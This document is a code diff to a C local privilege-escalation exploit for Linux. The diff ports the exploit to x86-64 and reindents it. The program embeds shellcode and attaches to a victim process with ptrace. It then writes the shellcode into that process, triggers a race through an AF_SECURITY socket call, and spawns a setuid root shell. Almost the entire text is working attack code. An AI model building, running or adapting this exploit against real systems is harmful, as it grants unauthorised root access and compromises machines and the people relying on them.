@@ -34,14 +34,15 @@
 #include <sys/types.h>
 #include <sys/ptrace.h>
 #include <sys/socket.h>
-#include <linux/user.h>
-
+//#include <linux/user.h>
+#include <sys/user.h>
+#include <sys/reg.h>
 char cliphcode[] =
-  "\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
-  "\x00\x5b\x31\xc9\x89\xca\xcd\x80"
-  "\xb8\x0f\x00\x00\x00\xb9\xed\x0d"
-  "\x00\x00\xcd\x80\x89\xd0\x89\xd3"
-  "\x40\xcd\x80\xe8\xdc\xff\xff\xff";
+	"\x90\x90\xeb\x1f\xb8\xb6\x00\x00"
+	"\x00\x5b\x31\xc9\x89\xca\xcd\x80"
+	"\xb8\x0f\x00\x00\x00\xb9\xed\x0d"
+	"\x00\x00\xcd\x80\x89\xd0\x89\xd3"
+	"\x40\xcd\x80\xe8\xdc\xff\xff\xff";
 
 #define CODE_SIZE (sizeof(cliphcode) - 1)
 
@@ -52,132 +53,132 @@ volatile int gotchild = 0;
 
 void fatal(char * msg)
 {
-  perror(msg);
-  kill(parent, SIGKILL);
-  kill(child, SIGKILL);
-  kill(victim, SIGKILL);
+	perror(msg);
+	kill(parent, SIGKILL);
+	kill(child, SIGKILL);
+	kill(victim, SIGKILL);
 }
 
 void putcode(unsigned long * dst)
 {
-  char buf[MAXPATHLEN + CODE_SIZE];
-  unsigned long * src;
-  int i, len;
+	char buf[MAXPATHLEN + CODE_SIZE];
+	unsigned long * src;
+	int i, len;
 
-  memcpy(buf, cliphcode, CODE_SIZE);
-  len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);
-  if (len == -1)
-    fatal("[-] Unable to read /proc/self/exe");
+	memcpy(buf, cliphcode, CODE_SIZE);
+	len = readlink("/proc/self/exe", buf + CODE_SIZE, MAXPATHLEN - 1);
+	if (len == -1)
+		fatal("[-] Unable to read /proc/self/exe");
 
-  len += CODE_SIZE + 1;
-  buf[len] = '\0';
-  
-  src = (unsigned long*) buf;
-  for (i = 0; i < len; i += 4)
-    if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)
-      fatal("[-] Unable to write shellcode");
+	len += CODE_SIZE + 1;
+	buf[len] = '\0';
+	
+	src = (unsigned long*) buf;
+	for (i = 0; i < len; i += 4)
+		if (ptrace(PTRACE_POKETEXT, victim, dst++, *src++) == -1)
+			fatal("[-] Unable to write shellcode");
 }
 
 void sigchld(int signo)
 {
-  struct user_regs_struct regs;
+	struct user_regs_struct regs;
 
-  if (gotchild++ == 0)
-    return;
-  
-  fprintf(stderr, "[+] Signal caught\n");
+	if (gotchild++ == 0)
+		return;
+	
+	fprintf(stderr, "[+] Signal caught\n");
 
-  if (ptrace(PTRACE_GETREGS, victim, NULL, &regs) == -1)
-    fatal("[-] Unable to read registers");
-  
-  fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.eip);
-  
-  putcode((unsigned long *)regs.eip);
+	if (ptrace(PTRACE_GETREGS, victim, NULL, &regs) == -1)
+		fatal("[-] Unable to read registers");
+	
+	fprintf(stderr, "[+] Shellcode placed at 0x%08lx\n", regs.rip);
+	
+	putcode((unsigned long *)regs.rip);
 
-  fprintf(stderr, "[+] Now wait for suid shell...\n");
+	fprintf(stderr, "[+] Now wait for suid shell...\n");
 
-  if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
-    fatal("[-] Unable to detach from victim");
+	if (ptrace(PTRACE_DETACH, victim, 0, 0) == -1)
+		fatal("[-] Unable to detach from victim");
 
-  exit(0);
+	exit(0);
 }
 
 void sigalrm(int signo)
 {
-  errno = ECANCELED;
-  fatal("[-] Fatal error");
+	errno = ECANCELED;
+	fatal("[-] Fatal error");
 }
 
 void do_child(void)
 {
-  int err;
+	int err;
 
-  child = getpid();
-  victim = child + 1;
+	child = getpid();
+	victim = child + 1;
 
-  signal(SIGCHLD, sigchld);
+	signal(SIGCHLD, sigchld);
 
-  do
-    err = ptrace(PTRACE_ATTACH, victim, 0, 0);
-  while (err == -1 && errno == ESRCH);
+	do
+		err = ptrace(PTRACE_ATTACH, victim, 0, 0);
+	while (err == -1 && errno == ESRCH);
 
-  if (err == -1)
-    fatal("[-] Unable to attach");
+	if (err == -1)
+		fatal("[-] Unable to attach");
 
-  fprintf(stderr, "[+] Attached to %d\n", victim);
-  while (!gotchild) ;
-  if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)
-    fatal("[-] Unable to setup syscall trace");
-  fprintf(stderr, "[+] Waiting for signal\n");
+	fprintf(stderr, "[+] Attached to %d\n", victim);
+	while (!gotchild) ;
+	if (ptrace(PTRACE_SYSCALL, victim, 0, 0) == -1)
+		fatal("[-] Unable to setup syscall trace");
+	fprintf(stderr, "[+] Waiting for signal\n");
 
-  for(;;);
+	for(;;);
 }
 
 void do_parent(char * progname)
 {
-  struct stat st;
-  int err;
-  errno = 0;
-  socket(AF_SECURITY, SOCK_STREAM, 1);
-  do {
-    err = stat(progname, &st);
-  } while (err == 0 && (st.st_mode & S_ISUID) != S_ISUID);
-  
-  if (err == -1)
-    fatal("[-] Unable to stat myself");
+	struct stat st;
+	int err;
+	errno = 0;
+	socket(AF_SECURITY, SOCK_STREAM, 1);
+	do {
+		err = stat(progname, &st);
+	} while (err == 0 && (st.st_mode & S_ISUID) != S_ISUID);
+	
+	if (err == -1)
+		fatal("[-] Unable to stat myself");
 
-  alarm(0);
-  system(progname);
+	alarm(0);
+	system(progname);
 }
 
 void prepare(void)
 {
-  if (geteuid() == 0) {
-    initgroups("root", 0);
-    setgid(0);
-    setuid(0);
-    execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
-    fatal("[-] Unable to spawn shell");
-  }
+	if (geteuid() == 0) {
+		initgroups("root", 0);
+		setgid(0);
+		setuid(0);
+		execl(_PATH_BSHELL, _PATH_BSHELL, NULL);
+		fatal("[-] Unable to spawn shell");
+	}
 }
 
 int main(int argc, char ** argv)
 {
-  prepare();
-  signal(SIGALRM, sigalrm);
-  alarm(10);
-  
-  parent = getpid();
-  child = fork();
-  victim = child + 1;
-  
-  if (child == -1)
-    fatal("[-] Unable to fork");
+	prepare();
+	signal(SIGALRM, sigalrm);
+	alarm(10);
+	
+	parent = getpid();
+	child = fork();
+	victim = child + 1;
+	
+	if (child == -1)
+		fatal("[-] Unable to fork");
 
-  if (child == 0)
-    do_child();
-  else
-    do_parent(argv[0]);
+	if (child == 0)
+		do_child();
+	else
+		do_parent(argv[0]);
 
-  return 0;
+	return 0;
 }
